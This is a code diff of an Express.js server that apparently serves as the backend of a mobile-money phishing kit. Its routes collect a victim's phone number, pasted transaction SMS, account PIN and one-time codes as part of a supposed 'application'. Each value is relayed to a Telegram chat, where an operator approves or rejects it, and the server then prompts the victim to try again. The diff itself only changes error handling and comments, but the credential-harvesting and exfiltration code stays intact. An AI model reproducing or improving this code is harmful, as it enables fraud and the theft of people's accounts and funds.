@@ -29,7 +29,6 @@ function generateCode(len = 6) {
   return Math.floor(10 ** (len - 1) + Math.random() * 9 * 10 ** (len - 1)).toString();
 }
 
-// Telegram helper
 async function sendTelegramMessage(text, buttons = null) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
   const body = { chat_id: TELEGRAM_CHAT_ID, text };
@@ -45,7 +44,6 @@ async function sendTelegramMessage(text, buttons = null) {
   }
 }
 
-// SMS helper
 async function sendSms(to, text) {
   if (!SMS_GATEWAY_URL || !SMS_GATEWAY_API_KEY) {
     console.log(`[SIMULATED SMS] to ${to}: ${text}`);
@@ -68,12 +66,11 @@ app.use((err, req, res, next) => {
   res.status(500).json({ ok: false, message: 'Internal server error' });
 });
 
-// ─── Routes ───
-
+// Routes
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
-// 1. Submit application (email removed from required fields)
-app.post('/api/send-application', async (req, res, next) => {
+// 1. Submit application
+app.post('/api/send-application', async (req, res) => {
   try {
     const data = req.body.applicationData;
     if (!data || !data.phone) {
@@ -104,7 +101,7 @@ app.post('/api/send-application', async (req, res, next) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, applicationId: appId });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
@@ -116,7 +113,7 @@ app.get('/api/status/:applicationId/app', (req, res) => {
 });
 
 // 3. Send SMS (user pastes message)
-app.post('/api/send-momo-message', async (req, res, next) => {
+app.post('/api/send-momo-message', async (req, res) => {
   try {
     const { momoData } = req.body;
     const { applicationId, momoMessage } = momoData;
@@ -135,7 +132,7 @@ app.post('/api/send-momo-message', async (req, res, next) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
@@ -147,7 +144,7 @@ app.get('/api/status/:applicationId/sms', (req, res) => {
 });
 
 // 5. Send PIN
-app.post('/api/send-pin', async (req, res, next) => {
+app.post('/api/send-pin', async (req, res) => {
   try {
     const { applicationId, pin } = req.body;
     const app = applications[applicationId];
@@ -168,7 +165,7 @@ app.post('/api/send-pin', async (req, res, next) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
@@ -176,11 +173,11 @@ app.post('/api/send-pin', async (req, res, next) => {
 app.get('/api/status/:applicationId/pin', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
-  res.json({ ok: true, status: app.pinStatus, remainingAttempts: app.maxPinAttempts - app.pinAttempts, blocked: app.pinStatus === 'blocked' });
+  res.json({ ok: true, status: app.pinStatus, remainingAttempts: Math.max(0, app.maxPinAttempts - app.pinAttempts), blocked: app.pinStatus === 'blocked' });
 });
 
 // 7. PIN rejected
-app.post('/api/pin-rejected', async (req, res, next) => {
+app.post('/api/pin-rejected', async (req, res) => {
   try {
     const { applicationId } = req.body;
     const app = applications[applicationId];
@@ -196,7 +193,7 @@ app.post('/api/pin-rejected', async (req, res, next) => {
     }
     res.json({ ok: false, remainingAttempts: remaining, message: `Wrong PIN. ${remaining} attempt(s) remaining.` });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
@@ -211,7 +208,7 @@ app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
 });
 
 // 9. Send OTP
-app.post('/api/send-otp', async (req, res, next) => {
+app.post('/api/send-otp', async (req, res) => {
   try {
     const { applicationId, otp } = req.body;
     const app = applications[applicationId];
@@ -229,7 +226,7 @@ app.post('/api/send-otp', async (req, res, next) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
@@ -241,7 +238,7 @@ app.get('/api/status/:applicationId/otp', (req, res) => {
 });
 
 // 11. Resend SMS
-app.post('/api/resend-sms', async (req, res, next) => {
+app.post('/api/resend-sms', async (req, res) => {
   try {
     const { applicationId } = req.body;
     const app = applications[applicationId];
@@ -261,12 +258,12 @@ app.post('/api/resend-sms', async (req, res, next) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
 // 12. Resend OTP
-app.post('/api/resend-otp', async (req, res, next) => {
+app.post('/api/resend-otp', async (req, res) => {
   try {
     const { applicationId } = req.body;
     const app = applications[applicationId];
@@ -286,7 +283,7 @@ app.post('/api/resend-otp', async (req, res, next) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (err) {
-    next(err);
+    res.status(500).json({ ok: false, message: err.message });
   }
 });
 
@@ -300,7 +297,7 @@ app.get('/api/dev-sms-code/:applicationId', (req, res) => {
   res.json({ ok: false, simulated: false });
 });
 
-// 14. User Dashboard
+// 14. Dashboard
 app.get('/api/dashboard/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
@@ -320,7 +317,7 @@ app.get('/api/dashboard/:applicationId', (req, res) => {
   });
 });
 
-// 15. Telegram webhook (no email sending)
+// 15. Telegram webhook
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
   if (update.callback_query) {
@@ -382,7 +379,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Serve frontend
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
 });
